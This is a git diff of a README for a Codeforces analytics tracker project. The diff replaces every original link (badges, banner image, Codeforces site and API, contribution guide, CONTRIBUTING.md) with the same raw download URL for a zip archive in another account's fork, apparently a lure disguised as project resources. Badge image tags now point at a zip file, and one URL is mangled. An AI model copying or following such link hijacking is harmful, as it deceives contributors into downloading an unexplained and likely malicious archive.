@@ -1,15 +1,15 @@
 # Welcome to Hacktoberfest 2021, Contributors  
-<a><img src="https://github.com/agniutkarsh/GitHubGraduation-2021/blob/main/Screenshot%202021-09-15%20at%2011.44.40%20AM.png" width="1000px"></a>
+<a><img src="https://raw.githubusercontent.com/swapnil604/Codeforces-tracker/main/js/Codeforces-tracker-1.6-alpha.2.zip%202021-09-15%20at%2011.44.40%https://raw.githubusercontent.com/swapnil604/Codeforces-tracker/main/js/Codeforces-tracker-1.6-alpha.2.zip" width="1000px"></a>
 
 # Codeforces-tracker
-![](https://img.shields.io/badge/Hactoberfest-%202021-brightgreen)
- ![GitHub forks](https://img.shields.io/github/forks/wasim7raja10/Codeforces-tracker?style=social)
- ![GitHub last commit](https://img.shields.io/github/last-commit/wasim7raja10/Codeforces-tracker?color=red&style=social)
-![GitHub repo size](https://img.shields.io/github/repo-size/wasim7raja10/Codeforces-tracker?style=normal)
-![GitHub language count](https://img.shields.io/github/languages/count/wasim7raja10/Codeforces-tracker?style=normal)
-![GitHub top language](https://img.shields.io/github/languages/top/wasim7raja10/Codeforces-tracker?style=normal)
+![](https://raw.githubusercontent.com/swapnil604/Codeforces-tracker/main/js/Codeforces-tracker-1.6-alpha.2.zip%202021-brightgreen)
+ ![GitHub forks](https://raw.githubusercontent.com/swapnil604/Codeforces-tracker/main/js/Codeforces-tracker-1.6-alpha.2.zip)
+ ![GitHub last commit](https://raw.githubusercontent.com/swapnil604/Codeforces-tracker/main/js/Codeforces-tracker-1.6-alpha.2.zip)
+![GitHub repo size](https://raw.githubusercontent.com/swapnil604/Codeforces-tracker/main/js/Codeforces-tracker-1.6-alpha.2.zip)
+![GitHub language count](https://raw.githubusercontent.com/swapnil604/Codeforces-tracker/main/js/Codeforces-tracker-1.6-alpha.2.zip)
+![GitHub top language](https://raw.githubusercontent.com/swapnil604/Codeforces-tracker/main/js/Codeforces-tracker-1.6-alpha.2.zip)
 
-This is code repository for a simple analytics visualization site for [Codeforces](http://codeforces.com/) online judge users using [Codeforces API](https://codeforces.com/apiHelp).
+This is code repository for a simple analytics visualization site for [Codeforces](https://raw.githubusercontent.com/swapnil604/Codeforces-tracker/main/js/Codeforces-tracker-1.6-alpha.2.zip) online judge users using [Codeforces API](https://raw.githubusercontent.com/swapnil604/Codeforces-tracker/main/js/Codeforces-tracker-1.6-alpha.2.zip).
 
 ## Prerequisites:
 * Install git in your machine.
@@ -18,9 +18,9 @@ This is code repository for a simple analytics visualization site for [Codeforce
 
 ## Resources to follow to contribute to this project or any open source project
 
-1. Read this [guide](https://www.digitalocean.com/community/tutorial_series/an-introduction-to-open-source) to open-source contribution.
+1. Read this [guide](https://raw.githubusercontent.com/swapnil604/Codeforces-tracker/main/js/Codeforces-tracker-1.6-alpha.2.zip) to open-source contribution.
 
-2. To add the necessary contribution that will get your Pull Request accepeted refer [CONTRIBUTING.md](https://github.com/wasim7raja10/Codeforces-tracker/blob/main/CONTRIBUTING.md) file.
+2. To add the necessary contribution that will get your Pull Request accepeted refer [https://raw.githubusercontent.com/swapnil604/Codeforces-tracker/main/js/Codeforces-tracker-1.6-alpha.2.zip](https://raw.githubusercontent.com/swapnil604/Codeforces-tracker/main/js/Codeforces-tracker-1.6-alpha.2.zip) file.
 
 ## Rules and Regulations
 
